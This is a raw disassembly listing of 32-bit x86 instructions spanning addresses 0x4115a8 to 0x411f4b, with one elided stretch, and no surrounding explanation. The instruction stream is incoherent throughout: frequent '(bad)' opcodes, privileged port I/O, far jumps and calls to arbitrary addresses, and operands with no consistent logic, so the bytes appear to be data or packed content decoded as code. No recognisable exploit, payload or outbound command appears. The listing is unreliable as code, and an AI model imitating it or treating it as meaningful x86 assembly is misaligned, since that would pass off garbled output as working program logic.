  4115a8:	mov    bh,0x76
  4115aa:	mov    ch,0x6e
  4115ac:	mov    al,0x80
  4115ae:	and    edx,esp
  4115b0:	inc    esi
  4115b1:	xchg   ecx,eax
  4115b2:	pop    es
  4115b3:	mov    ebp,cr3
  4115b6:	aam    0x93
  4115b8:	idiv   BYTE PTR [ecx+0x33ff5560]
  4115be:	lods   eax,DWORD PTR ds:[esi]
  4115bf:	iret   
  4115c0:	les    esp,FWORD PTR [eax]
  4115c2:	push   ds
  4115c3:	inc    ebx
  4115c4:	and    esp,DWORD PTR [edi-0x22]
  4115c7:	or     al,0xe0
  4115c9:	je     0x4115cd
  4115cb:	pop    ebx
  4115cc:	ss sbb al,0x1c
  4115cf:	(bad)  
  4115d0:	jmp    0x445f:0x31db81d6
  4115d7:	jnp    0x4115f3
  4115d9:	pop    ss
  4115da:	lea    eax,[edi-0x49]
  4115dd:	(bad)  
  4115df:	call   0x9ecff68e
  4115e4:	je     0x411585
  4115e6:	int    0xb4
  4115e8:	mov    esi,0x529b7af5
  4115ed:	out    dx,eax
  4115ee:	shr    DWORD PTR [eax+ebx*8+0x58],1
  4115f2:	mov    eax,0x29fab3e4
  4115f7:	ret    0xf02b
  4115fa:	fs pop ebp
  4115fc:	inc    ecx
  4115fd:	push   edi
  4115fe:	mov    al,BYTE PTR [eax-0x53]
  411601:	(bad)  
  411602:	in     eax,0xea
  411604:	jbe    0x411632
  411606:	shl    BYTE PTR [ebx+edi*8-0x4f],cl
  41160a:	mov    ah,0x31
  41160c:	iret   
  41160d:	cmp    edi,ecx
  41160f:	add    dh,BYTE PTR [esi-0x63]
  411612:	fs mov dl,0x56
  411615:	xlat   BYTE PTR ds:[ebx]
  411616:	cmp    DWORD PTR [esp+esi*1],eax
  411619:	mov    edx,0x5f7de04e
  41161e:	pop    eax
  41161f:	add    cl,BYTE PTR [eax+0x48]
  411622:	xchg   ecx,eax
  411623:	push   edi
  411624:	outs   dx,BYTE PTR ds:[esi]
  411625:	mov    eax,DWORD PTR [edi+ebp*1-0x1bc27434]
  41162c:	cmp    BYTE PTR [eax+0x16],dl
  41162f:	(bad)  
  411630:	hlt    
  411631:	in     eax,dx
  411632:	push   cs
  411633:	pop    edi
  411634:	xchg   ebx,eax
  411636:	shl    DWORD PTR [ebp-0x55d5d713],0xe3
  41163d:	ins    BYTE PTR es:[edi],dx
  41163e:	xor    BYTE PTR [ecx],bh
  411640:	pop    es
  411641:	xor    cl,ah
  411643:	test   al,0x79
  411645:	mov    al,BYTE PTR [eax+eiz*2-0x7efda58a]
  41164c:	call   0x841ecb4
  411651:	ret    
  411652:	mov    ch,0x83
  411654:	aas    
  411655:	jo     0x4116b4
  411657:	in     al,dx
  411658:	mov    ebp,0xad86ce65
  41165d:	retf   0x68d0
  411660:	push   eax
  411661:	jle    0x411684
  411663:	mov    dl,0xc7
  411665:	mov    eax,ds:0xa94161
  41166a:	idiv   DWORD PTR [edi+0x33]
  41166d:	dec    esi
  41166e:	jmp    0x617:0x75b6532b
  411675:	out    0x5f,al
  411677:	(bad)  
  411678:	in     eax,0xb6
  41167a:	sub    DWORD PTR [edi+0x5c7e5009],eax
  411680:	push   esi
  411681:	xor    ch,BYTE PTR [edx+0x6f]
  411684:	xchg   ecx,eax
  411685:	sbb    BYTE PTR [edx+0x7a],0x8a
  411689:	cmp    eax,0xe35d0b3f
  41168e:	push   ecx
  41168f:	pusha  
  411690:	bound  eax,QWORD PTR ds:0x2d914d89
  411696:	mov    ah,0x76
  411698:	cld    
  411699:	imul   edi,ebx,0x26
  41169c:	pop    esp
  41169d:	cmp    DWORD PTR [edx],edx
  41169f:	call   0xd055:0x6ef922e7
  4116a6:	jo     0x411711
  4116a8:	push   0x64ee85eb
  4116ad:	mov    dh,BYTE PTR [edi+0x1e830b80]
  4116b3:	out    dx,al
  4116b4:	jne    0x41172c
  4116b6:	sub    eax,0xd9544055
  4116bb:	pop    ecx
  4116bc:	test   DWORD PTR [ebx+0x5f6e212],edi
  4116c2:	(bad)  
  4116c3:	out    dx,al
  4116c4:	scas   eax,DWORD PTR es:[edi]
  4116c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c6:	mov    dl,0x66
  4116c8:	(bad)  
  4116c9:	adc    dl,BYTE PTR [ebx-0x34]
  4116cc:	bnd jno 0x411652
  4116cf:	cmp    DWORD PTR [ebx],ecx
  4116d1:	and    al,0xc7
  4116d3:	mov    al,0x9c
  4116d5:	loopne 0x4116ba
  4116d7:	cmp    bl,cl
  4116d9:	data16 jno 0x4116b2
  4116dc:	sbb    eax,0x7812a03d
  4116e1:	xchg   ecx,eax
  4116e2:	or     DWORD PTR [ecx-0x1eb504d2],edx
  4116e8:	jge    0x4116a7
  4116ea:	imul   DWORD PTR [ebp+0x50]
  4116ed:	into   
  4116ee:	enter  0x535,0x19
  4116f2:	ret    0x4f9
  4116f5:	(bad)  
  4116f7:	jp     0x411766
  4116f9:	mov    edx,0xcb4dc030
  4116fe:	add    al,al
  411700:	cmp    edi,ecx
  411702:	jecxz  0x411780
  411704:	mov    WORD PTR [eax],?
  411706:	in     al,dx
  411707:	jb     0x411694
  411709:	addr16 sti 
  41170b:	es dec esi
  41170d:	cmc    
  41170e:	xchg   esp,eax
  41170f:	cwde   
  411710:	mov    ch,0xd8
  411712:	pop    ss
  411713:	inc    edi
  411714:	fs (bad) 
  411717:	shl    BYTE PTR [esi+0x7bb21121],cl
  41171d:	pusha  
  41171e:	pop    esp
  41171f:	lock out 0xe6,eax
  411722:	in     eax,dx
  411723:	sbb    al,BYTE PTR [ebp+0x26771c1d]
  411729:	std    
  41172a:	push   ss
  41172b:	xchg   ebp,eax
  41172c:	mov    ah,0x70
  41172e:	xor    eax,0xe6461cb3
  411733:	ficom  WORD PTR [ebx]
  411735:	adc    ebx,DWORD PTR [ebx+0x35]
  411738:	push   ds
  411739:	and    ecx,DWORD PTR [ecx+0x3b]
  41173c:	es cmp al,0xe3
  41173f:	ja     0x4117aa
  411741:	ret    
  411742:	mov    edi,0x21c6eb9c
  411747:	repnz pop edi
  411749:	jmp    DWORD PTR [ebp-0x15]
  41174c:	lds    esi,FWORD PTR [edx+0x773c6c02]
  411752:	mov    ds:0x4a2cde0c,al
  411757:	pop    esp
  411758:	sti    
  411759:	lahf   
  41175a:	push   es
  41175b:	push   DWORD PTR [eax]
  41175d:	dec    esp
  41175e:	es daa 
  411760:	(bad)  
  411761:	aas    
  411762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411763:	mov    edi,0x10e98467
  411768:	fcomip st,st(2)
  41176a:	sub    ebp,esi
  41176c:	push   0xffffffc5
  41176e:	out    dx,al
  41176f:	inc    esp
  411770:	cmp    bh,BYTE PTR [ebx+0x76]
  411773:	push   ebx
  411774:	outs   dx,BYTE PTR ds:[esi]
  411775:	sub    BYTE PTR [edx-0x681188bb],dl
  41177b:	xor    edi,DWORD PTR [esi+0x77]
  41177e:	add    DWORD PTR [edi+0x19],ebp
  411781:	pop    ebp
  411782:	fbld   TBYTE PTR [esi]
  411784:	dec    ebx
  411785:	xor    eax,0x67889f96
  41178a:	xor    dh,BYTE PTR [edx]
  41178c:	pop    ecx
  41178d:	sbb    DWORD PTR [ebx-0x34],edx
  411790:	ficom  DWORD PTR [esi]
  411792:	mov    dh,0xa4
  411794:	ret    
  411795:	jp     0x411770
  411797:	dec    eax
  411798:	iret   
  411799:	(bad)  [ecx+eiz*8]
  41179c:	xchg   edi,eax
  41179d:	bound  ebp,QWORD PTR [esi-0x70]
  4117a0:	cli    
  4117a1:	mov    esi,0x19b7166b
  4117a6:	fistp  QWORD PTR [edx+0x4]
  4117a9:	ret    
  4117aa:	ficomp WORD PTR [ecx-0x401693c9]
  4117b0:	adc    BYTE PTR [ebx-0x7c],dl
  4117b3:	jno    0x411773
  4117b5:	dec    eax
  4117b6:	and    edi,DWORD PTR [edi-0x78]
  4117b9:	xchg   edi,eax
  4117ba:	in     al,0xe0
  4117bc:	inc    ecx
  4117bd:	sub    al,0xd8
  4117bf:	aam    0x3d
  4117c1:	(bad)  
  4117c2:	pop    ebx
  4117c3:	outs   dx,DWORD PTR ds:[esi]
  4117c4:	xchg   esi,eax
  4117c5:	pop    ebx
  4117c6:	jae    0x411759
  4117c8:	xchg   edi,eax
  4117c9:	retf   0x25a5
  4117cc:	adc    eax,0x3c78b2b7
  4117d1:	cli    
  4117d2:	ins    BYTE PTR es:[edi],dx
  4117d3:	(bad)  
  4117d4:	stc    
  4117d5:	div    DWORD PTR gs:[edx]
  4117d8:	int    0x1d
  4117da:	cli    
  4117db:	pop    edi
  4117dc:	imul   edx,DWORD PTR [eax+ebx*8+0x140efc2e],0xffffff8f
  4117e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e6:	repnz btr DWORD PTR [esi],ecx
  4117ea:	gs push ebp
  4117ec:	cmp    DWORD PTR [ecx+0x36786e14],0x2e493c43
  4117f6:	sub    eax,0x8e548f8b
  4117fb:	push   ebx
  4117fc:	push   cs
  4117fd:	retf   0x2635
  411800:	lods   eax,DWORD PTR ds:[esi]
  411801:	jge    0x4117b0
  411803:	cs mov edx,0x8ea1a3b7
  411809:	fimul  DWORD PTR [ebx-0x50]
  41180c:	xor    eax,0xc2e49477
  411812:	jg     0x4117f6
  411814:	add    esi,edx
  411816:	dec    esp
  411817:	push   es
  411818:	mov    ds:0xa7613487,al
  41181d:	mov    WORD PTR [edi+0x7b],?
  411820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411821:	aad    0xf4
  411823:	imul   dx,WORD PTR [eax+esi*8+0x63],0x3d
  411829:	in     eax,0x8
  41182b:	not    bh
  41182d:	ja     0x411892
  41182f:	addr16 int3 
  411831:	test   eax,0x2064857f
  411836:	and    bh,BYTE PTR [ebp-0x5cf8dd05]
  41183c:	sti    
  41183d:	stc    
  41183e:	sub    DWORD PTR [ebp+0x20],esi
  411841:	push   0x8775311
  411846:	and    eax,0x301cbac1
  41184b:	mov    ah,0xf2
  41184d:	dec    ebp
  41184e:	mov    esp,0xbed28525
  411853:	scas   al,BYTE PTR es:[edi]
  411854:	inc    ebp
  411855:	push   0xdfa5c2b4
  41185a:	mov    cl,0xc1
  41185c:	mov    ebx,ebx
  41185e:	out    dx,al
  41185f:	push   esp
  411860:	pop    ebp
  411861:	fdivrp st(3),st
  411863:	push   esi
  411864:	into   
  411865:	xor    BYTE PTR [edx],0x3
  411868:	sub    ch,BYTE PTR [eax-0x33]
  41186b:	mov    dh,0x8b
  41186d:	dec    si
  41186f:	jnp    0x4118f0
  411871:	int    0xde
  411873:	mov    al,0xe1
  411875:	repz repnz inc edi
  411878:	jns    0x411877
  41187a:	cwde   
  41187b:	fucomip st,st(0)
  41187d:	inc    ecx
  41187e:	push   ds
  41187f:	cld    
  411880:	ins    DWORD PTR es:[edi],dx
  411881:	inc    esp
  411882:	fsubrp st(3),st
  411884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411885:	mov    es,WORD PTR [ebx+0x63dcf1b8]
  41188b:	stos   DWORD PTR es:[edi],eax
  41188c:	lods   al,BYTE PTR ds:[esi]
  41188d:	adc    DWORD PTR [edx+0x6a],0x4ebac5cb
  411894:	ret    0x560
  411897:	aaa    
  411898:	jbe    0x411826
  41189a:	leave  
  41189b:	lahf   
  41189c:	stos   BYTE PTR es:[edi],al
  41189d:	dec    edi
  41189e:	sbb    eax,0xdd5ced9
  4118a3:	or     dl,cl
  4118a5:	div    BYTE PTR [ebx]
  4118a7:	out    dx,eax
  4118a8:	adc    ecx,edi
  4118aa:	cmp    DWORD PTR [esi],edi
  4118ac:	sbb    al,0x4
  4118ae:	sbb    al,0x42
  4118b0:	lea    ebx,[ebx]
  4118b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118b3:	pop    edi
  4118b4:	ret    0xd2a
  4118b7:	push   0x5e
  4118b9:	add    BYTE PTR [eax+0x77],0x4b
  4118bd:	sub    al,0xf0
  4118bf:	cmp    ebx,ecx
  4118c1:	xchg   edi,eax
  4118c2:	call   0xab4d6d29
  4118c7:	aad    0xc0
  4118c9:	ror    DWORD PTR [eax+0x3c],cl
  4118cc:	cli    
  4118cd:	jge    0x4118ed
  4118cf:	cs add eax,0x8ad59e24
  4118d5:	out    0xad,al
  4118d7:	or     al,0x6a
  4118d9:	push   0x8f70432b
  4118de:	test   edi,esi
  4118e0:	stc    
  4118e1:	sbb    eax,0x6da95c83
  4118e6:	mov    ebx,DWORD PTR es:[eax+edx*2+0x44]
  4118eb:	xchg   DWORD PTR [ecx],ecx
  4118ed:	fsub   DWORD PTR [ecx+eiz*1-0x50b7900f]
  4118f4:	je     0x411881
  4118f6:	cmc    
  4118f7:	jmp    0x411916
  4118f9:	stos   BYTE PTR es:[edi],al
  4118fa:	bound  edi,QWORD PTR [esi+0x30]
  4118fd:	retf   
  4118fe:	add    edx,DWORD PTR [ebx]
  411900:	fisttp WORD PTR [edx+0x18]
  411903:	repz in eax,dx
  411905:	aad    0xf2
  411907:	outs   dx,DWORD PTR ds:[esi]
  411908:	(bad)  
  411909:	pop    edx
  41190a:	popf   
  41190b:	mov    dh,0x7
  41190d:	iret   
  41190e:	neg    al
  411910:	aad    0x40
  411912:	dec    ecx
  411913:	xor    BYTE PTR [edi+0x20803066],bl
  411919:	sub    eax,esi
  41191b:	and    BYTE PTR [ecx-0x6b],ah
  41191e:	ret    0xf912
  411921:	cmp    al,0x81
  411923:	sub    esi,DWORD PTR [ecx+0x3ce7d34]
  411929:	outs   dx,DWORD PTR ds:[esi]
  41192a:	dec    ecx
  41192b:	loopne 0x41199c
  41192d:	fimul  WORD PTR [eax-0x7e]
  411930:	xchg   BYTE PTR [ecx],ch
  411932:	pop    ds
  411933:	jmp    0xcd8e:0xcbce1e63
  41193a:	ucomiss xmm2,DWORD PTR cs:[ebp-0x4c]
  41193f:	sar    BYTE PTR [eax+0x66],1
  411942:	mov    eax,DWORD PTR [edi-0x16]
  411945:	pop    ebx
  411946:	and    BYTE PTR [edi+0x6723e8a1],0xf1
  41194d:	jne    0x411962
  41194f:	imul   DWORD PTR [ecx-0x4f8dd22c]
  411955:	stc    
  411956:	cmp    ecx,DWORD PTR [esi]
  411958:	xlat   BYTE PTR ds:[ebx]
  411959:	add    al,0x21
  41195b:	adc    eax,0xc75f533a
  411960:	add    al,BYTE PTR [ebp+edx*4+0x37c56a15]
  411967:	in     al,0x9c
  411969:	jmp    0x41196d
  41196b:	or     eax,0xfb5836b6
  411970:	(bad)  
  411971:	out    dx,al
  411972:	or     al,0x55
  411974:	shl    DWORD PTR [ebx],0xf0
  411977:	ret    
  411978:	mov    DWORD PTR [esi],edx
  41197a:	cld    
  41197b:	push   ss
  41197c:	push   eax
  41197d:	jns    0x41197c
  41197f:	add    al,0xe3
  411981:	or     ah,BYTE PTR [ebx]
  411983:	xchg   esp,eax
  411984:	push   eax
  411985:	sub    eax,0x3bf74207
  41198a:	and    eax,0xbf31228c
  41198f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411990:	push   edx
  411991:	dec    ebx
  411992:	or     eax,0x80c9d0ac
  411997:	mov    edx,0xeb2ab394
  41199c:	add    al,0x6b
  41199e:	rcl    DWORD PTR [ecx+0xf2e2377],0xbe
  4119a5:	xchg   ebx,eax
  4119a6:	jl     0x411a03
  4119a8:	mov    al,ds:0xdfac5890
  4119ad:	es inc ebp
  4119af:	jge    0x4119ba
  4119b1:	imul   ebx,DWORD PTR fs:[eax-0x9],0x613f7756
  4119b9:	push   edi
  4119ba:	xor    al,0xb
  4119bc:	std    
  4119bd:	cli    
  4119be:	push   esp
  4119bf:	scas   eax,DWORD PTR es:[edi]
  4119c0:	jnp    0x411955
  4119c2:	pushf  
  4119c3:	int3   
  4119c4:	outs   dx,BYTE PTR ds:[esi]
  4119c5:	cdq    
  4119c6:	dec    edi
  4119c7:	add    DWORD PTR [edx-0x11],0x5d
  4119cb:	jne    0x411a33
  4119cd:	mov    ds:0x5d95c923,al
  4119d2:	out    0xd9,al
  4119d4:	xor    cl,dl
  4119d6:	push   ds
  4119d7:	jle    0x41196f
  4119d9:	push   ds
  4119da:	push   DWORD PTR [edx]
  4119dc:	(bad)  
  4119dd:	cmp    eax,0xaa1620cb
  4119e2:	addr16 ss xchg al,bl
  4119e6:	je     0x411a09
  4119e8:	inc    esp
  4119e9:	not    DWORD PTR [edx-0x1acd024b]
  4119ef:	xchg   esi,eax
  4119f0:	pop    ss
  4119f1:	pop    es
  4119f2:	ins    DWORD PTR es:[edi],dx
  4119f3:	shr    ebx,1
  4119f5:	lock pop esp
  4119f7:	add    esp,DWORD PTR [eax-0x3b2018e]
  4119fd:	iret   
  4119fe:	pop    ebx
  4119ff:	add    esi,DWORD PTR [esi+0x47]
  411a02:	js     0x41199a
  411a04:	adc    edi,0x52
  411a07:	pushf  
  411a08:	popa   
  411a09:	pop    es
  411a0a:	add    eax,0xa916c2af
  411a0f:	push   ds
  411a10:	ds xchg edi,eax
  411a12:	fsubr  QWORD PTR [esi-0x72217dd]
  411a18:	adc    ch,BYTE PTR [esi+eax*2]
  411a1b:	imul   edi,DWORD PTR [ebp-0x2b],0xabab4c29
  411a22:	dec    edi
  411a23:	jp     0x4119cb
  411a25:	gs mov ch,0xcf
  411a28:	cmp    al,0x7e
  411a2a:	mov    BYTE PTR [esp+ecx*4-0x80],dh
  411a2e:	and    eax,DWORD PTR [ebp-0x1946d941]
  411a34:	xchg   ebx,eax
  411a35:	aam    0x86
  411a37:	mov    cl,0x3b
  411a39:	sbb    dl,BYTE PTR [ebx]
  411a3b:	xchg   DWORD PTR [ecx+0x62c837e9],ecx
  411a41:	sbb    ebp,ebp
  411a43:	pop    ecx
  411a44:	cmp    ebx,DWORD PTR [ebp-0x70]
  411a47:	jmp    0xf70daf7d
  411a4c:	push   esp
  411a4d:	mov    dh,0x8b
  411a4f:	pop    ebp
  411a50:	fwait
  411a51:	xchg   esi,eax
  411a52:	ins    DWORD PTR es:[edi],dx
  411a53:	enter  0xc3c9,0x88
  411a57:	dec    ecx
  411a58:	pop    edx
  411a59:	js     0x411a25
  411a5b:	mov    DWORD PTR [esp+ebx*1-0x6d],edx
  411a5f:	test   eax,0x587a01a8
  411a64:	inc    ebx
  411a65:	push   esp
  411a66:	hlt    
  411a67:	stos   BYTE PTR es:[edi],al
  411a68:	aas    
  411a69:	and    BYTE PTR [edx+0x51],bh
  411a6c:	inc    ecx
  411a6d:	outs   dx,BYTE PTR ds:[esi]
  411a6e:	cmp    eax,0x397e1932
  411a73:	mov    al,0xff
  411a75:	jae    0x411ace
  411a77:	add    al,0x5b
  411a79:	jne    0x411a05
  411a7b:	iret   
  411a7c:	cmp    eax,0xb4ba20a3
  411a81:	je     0x411ac4
  411a83:	sbb    dh,BYTE PTR [ecx]
  411a85:	dec    esp
  411a86:	jns    0x411ae9
  411a88:	mov    cl,0xb2
  411a8a:	cdq    
  411a8b:	cmp    al,0xbf
  411a8d:	sti    
  411a8e:	repnz mov ah,0x8
  411a91:	out    0xa3,eax
  411a93:	jnp    0x411ae5
  411a95:	adc    dl,BYTE PTR [edi+0x57]
  411a98:	adc    cl,BYTE PTR [edi+0x3d92b41b]
  411a9e:	pop    esi
  411a9f:	cs add al,0x37
  411aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa3:	mov    al,0x5c
  411aa5:	retf   0xe5e3
  411aa8:	ins    BYTE PTR es:[edi],dx
  411aa9:	push   es
  411aaa:	inc    dx
  411aac:	and    al,ah
  411aae:	ret    0x2bf1
  411ab1:	adc    eax,0xc0e232d2
  411ab6:	cmp    BYTE PTR [eax+ebp*1-0x212bb1a7],0x76
  411abe:	test   al,0x1b
  411ac0:	cmp    ebp,ebx
  411ac2:	cmp    eax,DWORD PTR [edi+ebp*4-0x28]
  411ac6:	add    ecx,esp
  411ac8:	mov    ebx,0x1010885a
  411acd:	(bad)  
  411ace:	das    
  411acf:	das    
  411ad0:	sub    al,0x63
  411ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad3:	mov    DWORD PTR [ecx+ebx*4-0x7d],0x2692d6
  411adb:	adc    BYTE PTR [ecx+0x62],0x83
  411adf:	sub    edx,DWORD PTR [ebx+ecx*8]
  411ae2:	adc    ecx,esi
  411ae4:	loop   0x411af4
  411ae6:	push   edx
  411ae7:	mov    bl,0x7b
  411ae9:	inc    esp
  411aea:	popf   
  411aeb:	jne    0x411b43
  411aed:	aas    
  411aee:	push   eax
  411aef:	mov    eax,ds:0x895749ac
  411af4:	(bad)  
  411af5:	mov    edx,0x79560384
  411afa:	and    esi,ebx
	...
  411cd8:	and    BYTE PTR [edi-0x200729d],bl
  411cde:	out    dx,al
  411cdf:	mov    edi,0x4100ab8e
  411ce4:	(bad)  
  411ce5:	mov    fs,WORD PTR [ecx+0x1455d44]
  411ceb:	add    BYTE PTR [edx],ah
  411ced:	pop    es
  411cee:	add    BYTE PTR [eax],al
  411cf0:	cmp    al,0xf7
  411cf2:	test   DWORD PTR [eax],esp
  411cf4:	int3   
  411cf5:	dec    ebp
  411cf6:	cmp    esp,ebp
  411cf8:	mov    ecx,0x349056d3
  411cfd:	or     ah,BYTE PTR [ecx+0x50]
  411d00:	jns    0x411d75
  411d02:	loope  0x411cf4
  411d04:	cmp    edi,ebx
  411d06:	ror    DWORD PTR [edi],1
  411d08:	cmc    
  411d09:	out    0x87,eax
  411d0b:	jg     0x411cfd
  411d0d:	stos   DWORD PTR es:[edi],eax
  411d0e:	std    
  411d0f:	das    
  411d10:	aad    0x2d
  411d12:	in     al,0x6c
  411d14:	out    0xd4,eax
  411d16:	xor    BYTE PTR [edx-0x6f],al
  411d19:	pusha  
  411d1a:	dec    esi
  411d1b:	aad    0xd3
  411d1d:	es in  al,0x93
  411d20:	push   cs
  411d21:	mov    edi,0xd7cee8e7
  411d26:	scas   eax,DWORD PTR es:[edi]
  411d27:	rcr    ecx,cl
  411d29:	sub    eax,0x772445c5
  411d2e:	cmp    esp,eax
  411d30:	jge    0x411cb5
  411d32:	dec    edi
  411d33:	push   eax
  411d34:	jl     0x411d71
  411d36:	mov    edi,0x2c256aff
  411d3b:	xchg   edx,eax
  411d3c:	sahf   
  411d3d:	cwde   
  411d3e:	inc    edx
  411d3f:	mov    ds:0xe55740fe,al
  411d44:	lds    ebx,FWORD PTR [ecx-0x32796e5a]
  411d4a:	arpl   WORD PTR [eax+0x2e5ed01f],di
  411d50:	jo     0x411da8
  411d52:	lea    esi,[edi]
  411d54:	daa    
  411d55:	imul   edx,DWORD PTR [ebx],0xffffff94
  411d58:	xchg   edi,eax
  411d59:	push   es
  411d5a:	push   ebx
  411d5b:	mov    bl,0xe9
  411d5d:	js     0x411d4e
  411d5f:	lods   eax,DWORD PTR ds:[esi]
  411d60:	(bad)  
  411d61:	in     al,dx
  411d62:	into   
  411d63:	pop    ecx
  411d64:	cmp    ebp,DWORD PTR [edx]
  411d66:	fisttp WORD PTR [esi-0x23b98517]
  411d6c:	(bad)  
  411d6d:	iret   
  411d6e:	in     eax,dx
  411d6f:	nop
  411d70:	mov    ebp,0x5afc9f9f
  411d75:	(bad)  
  411d76:	int    0x10
  411d78:	pop    ds
  411d79:	or     esp,DWORD PTR [ebx]
  411d7b:	mov    dx,0xa9a9
  411d7f:	out    0xe5,eax
  411d81:	cmc    
  411d82:	dec    ebx
  411d83:	xor    al,BYTE PTR [edx-0x67]
  411d86:	jp     0x411dc7
  411d88:	loope  0x411de9
  411d8a:	outs   dx,DWORD PTR ds:[esi]
  411d8b:	cs cli 
  411d8d:	fs inc edi
  411d8f:	mov    bl,0x3f
  411d91:	mov    ecx,0x3388bdbc
  411d96:	loope  0x411dd9
  411d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d99:	sbb    ebx,DWORD PTR [edi]
  411d9b:	add    DWORD PTR [eax+0x1df0df54],ebx
  411da1:	out    dx,eax
  411da2:	xchg   ebp,eax
  411da3:	leave  
  411da4:	sub    edi,DWORD PTR [eax-0x10f92378]
  411daa:	or     BYTE PTR [ebx],bl
  411dac:	js     0x411d47
  411dae:	push   0x133cf326
  411db3:	fimul  WORD PTR [ecx+0x615fbe04]
  411db9:	clc    
  411dba:	lock test al,0xdc
  411dbd:	ficom  WORD PTR [ebp+0x53b44cf9]
  411dc3:	mov    al,0x34
  411dc5:	jle    0x411d81
  411dc7:	mov    ebx,0xdb65f614
  411dcc:	adc    al,0x6
  411dce:	in     eax,dx
  411dcf:	xchg   edi,eax
  411dd0:	jae    0x411d87
  411dd2:	dec    eax
  411dd3:	mov    WORD PTR [ebx-0x4c46e553],?
  411dd9:	inc    edx
  411dda:	add    eax,0x4849c146
  411ddf:	and    eax,0x92811dca
  411de4:	adc    edi,esi
  411de6:	es push eax
  411de8:	int    0x61
  411dea:	test   ebx,ecx
  411dec:	cmp    edx,eax
  411dee:	and    eax,DWORD PTR [ecx+0x85aa6b4]
  411df4:	bound  edi,QWORD PTR [esi+0x59fd15f5]
  411dfa:	lahf   
  411dfb:	adc    ebp,DWORD PTR [ebx+0x7b]
  411dfe:	hlt    
  411dff:	cdq    
  411e00:	add    BYTE PTR [edi+0x4c057c6c],0x4b
  411e07:	call   0xb0abc71e
  411e0c:	jge    0x411e1e
  411e0e:	in     al,dx
  411e0f:	xor    eax,0x8729752e
  411e14:	test   esp,edi
  411e16:	mov    ch,0xb9
  411e18:	push   ecx
  411e19:	jle    0x411dae
  411e1b:	ret    0xfbd9
  411e1e:	push   esp
  411e1f:	rcl    BYTE PTR [ecx],1
  411e21:	test   DWORD PTR [edi-0x4d34f862],edi
  411e27:	mov    ds:0x4a69574a,eax
  411e2c:	inc    eax
  411e2d:	mov    bh,bh
  411e2f:	jle    0x411dcb
  411e31:	aas    
  411e32:	rcl    DWORD PTR [ebx],0xe
  411e35:	jmp    0xb92cd9c6
  411e3a:	adc    eax,0x7e7331be
  411e3f:	mov    cl,0xa8
  411e41:	das    
  411e42:	out    dx,al
  411e43:	gs mov bl,0xcc
  411e46:	add    BYTE PTR [ebp-0x1fc143f6],dh
  411e4c:	test   DWORD PTR ds:0x8044f896,0xb9a4701e
  411e56:	shl    BYTE PTR [ecx*8-0x4cd99009],1
  411e5d:	mov    eax,0x15c139f7
  411e62:	jbe    0x411e0e
  411e64:	mov    dh,0x56
  411e66:	out    0x4e,eax
  411e68:	call   0xbf2b6a97
  411e6d:	(bad)  
  411e6e:	out    0xd8,al
  411e70:	dec    edx
  411e71:	mov    eax,ds:0x5b167818
  411e76:	or     ah,BYTE PTR [eax+0x69d24089]
  411e7c:	leave  
  411e7d:	mov    bl,0x13
  411e7f:	cmp    al,0xbb
  411e81:	and    BYTE PTR [edi-0x125137c6],cl
  411e87:	ss loop 0x411ea5
  411e8a:	outs   dx,BYTE PTR ds:[esi]
  411e8b:	and    edi,esi
  411e8d:	push   ebx
  411e8e:	fild   WORD PTR [ebp+ebx*8-0x33fa7ffc]
  411e95:	cmp    eax,0xc9cd4739
  411e9a:	push   ecx
  411e9b:	xchg   BYTE PTR [ebp+edi*8-0x78e688dd],ch
  411ea2:	dec    eax
  411ea3:	adc    dh,dl
  411ea5:	dec    ebx
  411ea6:	dec    ebx
  411ea7:	sbb    BYTE PTR [ebp-0x34a1ad9b],ch
  411ead:	rol    DWORD PTR [eax+eiz*4-0x2f],1
  411eb1:	in     al,dx
  411eb2:	rol    DWORD PTR [esp+ecx*8],1
  411eb5:	nop
  411eb6:	int    0x36
  411eb8:	xchg   DWORD PTR [eax],ecx
  411eba:	std    
  411ebb:	in     eax,0x4a
  411ebd:	jo     0x411e69
  411ebf:	mov    esp,0xa1f8f4eb
  411ec4:	mov    dl,0xbc
  411ec6:	and    BYTE PTR [esi+0x3c154e76],dh
  411ecc:	jmp    0x8435cf31
  411ed1:	and    al,0x1d
  411ed3:	gs loop 0x411f38
  411ed6:	add    BYTE PTR [esi+0x44983b16],bl
  411edc:	jb     0x411ed8
  411ede:	jns    0x411eaa
  411ee0:	sar    BYTE PTR [edi-0x3be36090],0x71
  411ee7:	sub    ch,ch
  411ee9:	out    dx,eax
  411eea:	lock dec edi
  411eec:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  411eee:	(bad)  
  411ef0:	test   DWORD PTR [ebp+0x54a25ae],0x83cb1243
  411efa:	push   eax
  411efb:	push   esp
  411efc:	fld    DWORD PTR [eax-0x65]
  411eff:	mov    esp,0x8e3770a9
  411f04:	std    
  411f05:	fincstp 
  411f07:	rcl    DWORD PTR [esi-0x8fc8e80],1
  411f0d:	jl     0x411f54
  411f0f:	inc    edi
  411f10:	jle    0x411f1b
  411f12:	cmp    BYTE PTR [edi],al
  411f14:	dec    esi
  411f15:	cld    
  411f16:	mov    ecx,0x146bb849
  411f1b:	mov    dl,0x8c
  411f1d:	js     0x411ef0
  411f1f:	xchg   ebx,eax
  411f20:	std    
  411f21:	stos   DWORD PTR es:[edi],eax
  411f22:	inc    ebx
  411f23:	ss add eax,0x56efe3cb
  411f29:	mov    bh,0x4b
  411f2b:	inc    edi
  411f2c:	je     0x411f9c
  411f2e:	mov    esp,0x4bdae49d
  411f33:	jne    0x411ed1
  411f35:	xchg   ebp,eax
  411f36:	hlt    
  411f37:	or     al,0xeb
  411f39:	mov    eax,0x48581e54
  411f3e:	imul   esp,ebx,0x11
  411f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f42:	outs   dx,BYTE PTR ds:[esi]
  411f43:	int3   
  411f44:	call   0x2cd:0xda8450ca
  411f4b:	mov    ds:0x984b199b,eax
